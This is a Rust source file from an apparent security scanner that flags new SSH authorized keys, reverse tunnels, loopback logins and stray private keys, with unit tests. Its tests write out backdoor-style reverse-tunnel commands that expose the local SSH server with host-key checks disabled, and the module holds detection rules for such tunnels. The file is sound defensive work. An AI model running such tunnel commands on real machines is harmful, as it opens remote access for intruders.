//! SSH access signals: keys that can log in, reverse tunnels, network logins and
//! private keys left outside ~/.ssh. Pure functions over parsed input; the
//! sources in `crate::sources::ssh` feed them from the live system.
//!
//! The October 2026 tampered Cursor extension did all four: it appended a key to
//! `authorized_keys`, kept an `ssh -N -R '*:0:localhost:22'` tunnel open, left the
//! tunnel key in a hidden temp file, and logins through the tunnel reached sshd
//! from loopback. See docs/threats NE-05, NE-20 and SC-19.
use crate::model::{Report, Severity};
use sha2::{Digest, Sha256};
use std::{net::IpAddr, path::Path};

// ------------------------------------------------------------------ base64

const B64: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

fn b64_decode(s: &str) -> Option<Vec<u8>> {
    let s = s.trim_end_matches('=');
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let (mut acc, mut bits) = (0u32, 0u32);
    for c in s.bytes() {
        let v = B64.iter().position(|&b| b == c)? as u32;
        acc = (acc << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    Some(out)
}

fn b64_encode_unpadded(data: &[u8]) -> String {
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let n = chunk.iter().fold(0u32, |a, &b| (a << 8) | b as u32) << (8 * (3 - chunk.len()));
        for i in 0..=chunk.len() {
            out.push(B64[((n >> (18 - 6 * i)) & 63) as usize] as char);
        }
    }
    out
}

// --------------------------------------------------------- authorized_keys

/// One key line from an `authorized_keys` file. The key body is never kept.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AuthorizedKey {
    pub line: usize,
    pub kind: String,
    /// `SHA256:...`, as `ssh-keygen -l` prints it.
    pub fingerprint: String,
    pub comment: String,
    /// Options before the key type (`command=`, `from=`, `restrict` ...), verbatim.
    pub options: String,
}

fn is_key_type(s: &str) -> bool {
    s.starts_with("ssh-")
        || s.starts_with("ecdsa-sha2-")
        || s.starts_with("sk-ssh-")
        || s.starts_with("sk-ecdsa-")
}

/// Splits off the options field, which may hold quoted spaces.
fn split_options(line: &str) -> (&str, &str) {
    let mut quoted = false;
    for (i, c) in line.char_indices() {
        match c {
            '"' => quoted = !quoted,
            ' ' | '\t' if !quoted => return (&line[..i], line[i..].trim_start()),
            _ => {}
        }
    }
    (line, "")
}

pub fn parse_authorized_keys(text: &str) -> Vec<AuthorizedKey> {
    let mut keys = vec![];
    for (i, raw) in text.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let (first, rest) = split_options(line);
        let (options, body) = if is_key_type(first) {
            ("", line)
        } else {
            (first, rest)
        };
        let mut fields = body.split_whitespace();
        let (Some(kind), Some(blob)) = (fields.next(), fields.next()) else {
            continue;
        };
        let Some(bytes) = b64_decode(blob) else {
            continue;
        };
        keys.push(AuthorizedKey {
            line: i + 1,
            kind: kind.into(),
            fingerprint: format!("SHA256:{}", b64_encode_unpadded(&Sha256::digest(&bytes))),
            comment: fields.collect::<Vec<_>>().join(" "),
            options: options.into(),
        });
    }
    keys
}

/// SSH keys published as indicators of compromise, with where they were published.
/// Matching is by fingerprint only; comments are trivially changed.
pub const KNOWN_BAD_KEYS: &[(&str, &str, &str)] = &[(
    "SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk",
    "the access key planted by the tampered Claude Code extension served from the Cursor marketplace on 2026-10-29",
    "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/",
)];

pub fn describe_key(path: &Path, k: &AuthorizedKey) -> String {
    let mut s = format!(
        "{} line {}: {} {}",
        path.display(),
        k.line,
        k.kind,
        k.fingerprint
    );
    if !k.comment.is_empty() {
        s.push_str(&format!(", comment \"{}\"", k.comment));
    }
    if !k.options.is_empty() {
        s.push_str(&format!(", options {}", k.options));
    }
    s
}

/// A key that can log in to this account and was not there before.
pub fn key_added_finding(r: &mut Report, path: &Path, k: &AuthorizedKey) {
    let mut evidence = describe_key(path, k);
    if let Some((_, what, source)) = KNOWN_BAD_KEYS.iter().find(|(f, ..)| *f == k.fingerprint) {
        evidence.push_str(&format!(
            ". This fingerprint is published as {what} ({source})."
        ));
    }
    r.add(
        "ssh.key.added",
        Severity::High,
        &format!(
            "A new SSH key can log in to your account{}",
            if k.comment.is_empty() {
                String::new()
            } else {
                format!(": \"{}\"", k.comment)
            }
        ),
        evidence,
        "If you did not add this key, remove its line, then check ~/.ssh, your crontab and startup files for anything added at the same time. Turn sshd off if you do not need to log in to this computer remotely.",
    );
}

// ----------------------------------------------------------------- tunnels

/// What an ssh or autossh command line forwards.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct SshTunnel {
    pub program: String,
    pub destination: Option<String>,
    /// Remote forward specs, e.g. "*:0:localhost:22".
    pub remote_forwards: Vec<String>,
    /// StrictHostKeyChecking off or known hosts sent to /dev/null.
    pub host_keys_unchecked: bool,
    /// -N: no remote command, the connection exists only to forward.
    pub forward_only: bool,
}

impl SshTunnel {
    /// Whether a remote forward points back at this computer's SSH server.
    pub fn exposes_local_ssh(&self) -> bool {
        self.remote_forwards.iter().any(|spec| {
            let parts: Vec<&str> = spec.split(':').collect();
            // [bind:]port:host:hostport, or a bare port (a SOCKS proxy).
            parts.len() >= 3
                && parts[parts.len() - 1] == "22"
                && is_local_host(parts[parts.len() - 2])
        })
    }
}

fn is_local_host(host: &str) -> bool {
    let host = host.trim_matches(|c| c == '[' || c == ']');
    host == "localhost"
        || host
            .parse::<IpAddr>()
            .is_ok_and(|ip| ip.is_loopback() || ip.is_unspecified())
}

/// ssh options that take an argument (ssh(1)). autossh adds -M with an argument.
const SSH_ARG_OPTIONS: &str = "BbcDEeFIiJLlmOoPpQRSWw";

fn program_name(args: &[String], exe: Option<&Path>) -> Option<String> {
    let base = |s: &str| s.rsplit('/').next().unwrap_or(s).to_string();
    let argv0 = args.first().map(|a| base(a));
    let exe = exe
        .and_then(|e| e.file_name())
        .map(|n| n.to_string_lossy().into_owned());
    [argv0, exe]
        .into_iter()
        .flatten()
        .find(|n| n == "ssh" || n == "autossh")
}

/// One `-o Key=value` option that matters for tunnels.
fn apply_option(key: &str, value: &str, t: &mut SshTunnel) {
    let value = value.trim_matches('"');
    match key.to_ascii_lowercase().as_str() {
        "remoteforward" => t.remote_forwards.push(value.replace(' ', ":")),
        "stricthostkeychecking" if matches!(value.to_ascii_lowercase().as_str(), "no" | "off") => {
            t.host_keys_unchecked = true
        }
        "userknownhostsfile" | "globalknownhostsfile" if value == "/dev/null" => {
            t.host_keys_unchecked = true
        }
        _ => {}
    }
}

/// The remote forwards in an ssh or autossh command line, or None if it is not
/// one or forwards nothing back.
pub fn parse_tunnel(args: &[String], exe: Option<&Path>) -> Option<SshTunnel> {
    let program = program_name(args, exe)?;
    let mut t = SshTunnel {
        program: program.clone(),
        ..Default::default()
    };
    let mut i = 1;
    while i < args.len() {
        let arg = &args[i];
        if arg == "--" {
            t.destination = args.get(i + 1).cloned();
            break;
        }
        if !arg.starts_with('-') || arg.len() < 2 {
            t.destination = Some(arg.clone());
            break; // the rest is the remote command
        }
        let flags: Vec<char> = arg[1..].chars().collect();
        for (j, &c) in flags.iter().enumerate() {
            let takes_arg = SSH_ARG_OPTIONS.contains(c) || (c == 'M' && program == "autossh");
            if !takes_arg {
                if c == 'N' {
                    t.forward_only = true;
                }
                continue;
            }
            let attached: String = flags[j + 1..].iter().collect();
            let value = if attached.is_empty() {
                i += 1;
                args.get(i).cloned().unwrap_or_default()
            } else {
                attached
            };
            match c {
                'R' => t.remote_forwards.push(value),
                'o' => {
                    let (k, v) = value.split_once(['=', ' ']).unwrap_or((value.as_str(), ""));
                    apply_option(k.trim(), v.trim(), &mut t);
                }
                _ => {}
            }
            break;
        }
        i += 1;
    }
    (!t.remote_forwards.is_empty()).then_some(t)
}

/// Editors whose extensions run with your account's full access.
pub const EDITORS: &[&str] = &[
    "code",
    "code-oss",
    "codium",
    "vscodium",
    "cursor",
    "windsurf",
    "antigravity",
    "zed",
];

/// A reverse tunnel. High when it publishes this computer's SSH server, skips
/// host-key checks, or was started from an editor; Review otherwise, since
/// developers use `ssh -R` on purpose.
pub fn tunnel_finding(
    r: &mut Report,
    t: &SshTunnel,
    pid: u32,
    command: &str,
    started_by: &[String],
) {
    let editor = started_by.iter().find(|n| EDITORS.contains(&n.as_str()));
    let dest = t.destination.as_deref().unwrap_or("another computer");
    let mut reasons = vec![];
    if t.exposes_local_ssh() {
        reasons.push("it makes this computer's SSH server reachable from there".to_string());
    }
    if t.host_keys_unchecked {
        reasons.push("it does not check the server's host key".to_string());
    }
    if let Some(e) = editor {
        reasons.push(format!("it was started from {e}"));
    }
    let severity = if reasons.is_empty() {
        Severity::Review
    } else {
        Severity::High
    };
    let mut evidence = format!("pid {pid}: {command}");
    if !started_by.is_empty() {
        evidence.push_str(&format!("\nStarted by: {}", started_by.join(" ← ")));
    }
    if !reasons.is_empty() {
        evidence.push_str(&format!(
            "\nRated {severity:?} because {}.",
            reasons.join(", and ")
        ));
    }
    r.add(
        "ssh.tunnel.reverse",
        severity,
        &if t.exposes_local_ssh() {
            format!("{} is forwarding connections from {dest} to this computer's SSH server", t.program)
        } else {
            format!("{} is forwarding connections from {dest} back to this computer", t.program)
        },
        evidence,
        "If you did not start this tunnel, stop the process, then look for what restarts it (crontab -l, ~/.config/systemd/user, autostart entries) and check ~/.ssh/authorized_keys.",
    );
}

// ------------------------------------------------------------------ logins

/// Whether a session's remote host is this computer, which is how logins
/// through a reverse tunnel arrive.
pub fn from_loopback(host: &str) -> bool {
    is_local_host(host)
}

pub fn remote_login_finding(
    r: &mut Report,
    user: &str,
    host: Option<&str>,
    service: &str,
    tty: Option<&str>,
) {
    let host_text = host.unwrap_or("an unknown address");
    let loopback = host.is_some_and(from_loopback);
    let service = if service.is_empty() {
        "unknown service"
    } else {
        service
    };
    let mut evidence = format!("user {user}, from {host_text}, service {service}");
    if let Some(tty) = tty {
        evidence.push_str(&format!(", terminal {tty}"));
    }
    if loopback {
        evidence.push_str(". The login came from this computer itself: either someone here ran ssh to localhost, or it arrived through a tunnel.");
    }
    r.add(
        "ssh.login.remote",
        if loopback {
            Severity::High
        } else {
            Severity::Review
        },
        &format!("{user} logged in over the network from {host_text}"),
        evidence,
        "If this was not you, end the session (loginctl terminate-session), remove keys you do not recognise from ~/.ssh/authorized_keys, and change your password.",
    );
}

// --------------------------------------------------------------- stray keys

/// Whether the start of a file is an SSH private key.
pub fn is_ssh_private_key(head: &[u8]) -> bool {
    let head = String::from_utf8_lossy(&head[..head.len().min(256)]);
    let head = head.trim_start();
    [
        "-----BEGIN OPENSSH PRIVATE KEY-----",
        "-----BEGIN RSA PRIVATE KEY-----",
        "-----BEGIN EC PRIVATE KEY-----",
        "-----BEGIN DSA PRIVATE KEY-----",
    ]
    .iter()
    .any(|h| head.starts_with(h))
}

pub fn stray_key_finding(r: &mut Report, path: &Path, bytes: u64, mode: u32) {
    let hidden = path
        .file_name()
        .is_some_and(|n| n.to_string_lossy().starts_with('.'));
    r.add(
        "ssh.key.stray",
        Severity::Review,
        &format!(
            "A {}SSH private key is stored in {}",
            if hidden { "hidden " } else { "" },
            path.parent().map_or("?".into(), |p| p.display().to_string())
        ),
        format!("{}, {bytes} bytes, mode {:o}. The key itself was not read past its first line.", path.display(), mode & 0o7777),
        "If no tool you use put it there, keep a copy for investigation, look for an ssh or autossh process using it (ps -ef | grep ssh), then delete it.",
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(s: &str) -> Vec<String> {
        s.split(' ').map(String::from).collect()
    }

    #[test]
    fn fingerprints_match_ssh_keygen() {
        // `ssh-keygen -lf` on this public key prints SHA256:hTOPNSEt...
        let line = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPPpQFZtq1ipdMtRWzakAiiWvF0rBqugdNwS12wVgQRU fixture@example.invalid";
        let k = &parse_authorized_keys(line)[0];
        assert_eq!(k.kind, "ssh-ed25519");
        assert_eq!(k.comment, "fixture@example.invalid");
        assert_eq!(
            k.fingerprint,
            "SHA256:hTOPNSEtBp/y5RTtNxIDaTjZXCkr7kq9wI9L3CFyUXs"
        );
        assert_eq!(
            b64_encode_unpadded(b"any carnal pleas"),
            "YW55IGNhcm5hbCBwbGVhcw"
        );
        assert_eq!(
            b64_decode("YW55IGNhcm5hbCBwbGVhcw==").unwrap(),
            b"any carnal pleas"
        );
        assert!(b64_decode("not base64!").is_none());
    }

    #[test]
    fn options_with_quoted_spaces_are_kept_apart_from_the_key() {
        let text = "# comment\n\ncommand=\"echo hi there\",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPPpQFZtq1ipdMtRWzakAiiWvF0rBqugdNwS12wVgQRU backup key\n";
        let k = &parse_authorized_keys(text)[0];
        assert_eq!(k.line, 3);
        assert_eq!(k.options, "command=\"echo hi there\",no-pty");
        assert_eq!(k.comment, "backup key");
    }

    #[test]
    fn reverse_tunnels_are_recognised_in_every_spelling() {
        let t = parse_tunnel(
            &args("ssh -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=/tmp/x -R *:0:localhost:22 svc@203.0.113.7"),
            None,
        )
        .unwrap();
        assert!(t.exposes_local_ssh() && t.host_keys_unchecked && t.forward_only);
        assert_eq!(t.destination.as_deref(), Some("svc@203.0.113.7"));

        let t = parse_tunnel(&args("autossh -M 0 -fNR8022:127.0.0.1:22 host"), None).unwrap();
        assert_eq!(t.remote_forwards, ["8022:127.0.0.1:22"]);
        assert!(t.exposes_local_ssh());

        let t = parse_tunnel(
            // The shell keeps a quoted option value with a space as one argument.
            &["/usr/bin/ssh", "-oRemoteForward=9000 localhost:3000", "dev"].map(String::from),
            None,
        )
        .unwrap();
        assert_eq!(t.remote_forwards, ["9000:localhost:3000"]);
        assert!(!t.exposes_local_ssh() && !t.host_keys_unchecked);

        // Local forwards and plain logins are not reverse tunnels.
        assert!(parse_tunnel(&args("ssh -L 8080:localhost:80 host"), None).is_none());
        assert!(
            parse_tunnel(&args("ssh host -R 1:2:3"), None).is_none(),
            "after the host it is the remote command"
        );
        assert!(parse_tunnel(&args("sshd -R"), None).is_none());
    }

    #[test]
    fn loopback_logins_are_the_tunnel_signature() {
        assert!(from_loopback("127.0.0.1") && from_loopback("::1") && from_loopback("localhost"));
        assert!(!from_loopback("192.0.2.4"));
    }

    #[test]
    fn private_key_headers() {
        assert!(is_ssh_private_key(
            b"-----BEGIN OPENSSH PRIVATE KEY-----\nb3Blb"
        ));
        assert!(
            !is_ssh_private_key(b"-----BEGIN PRIVATE KEY-----\n"),
            "PKCS#8 is usually TLS"
        );
        assert!(!is_ssh_private_key(b"ssh-ed25519 AAAA public"));
    }
}
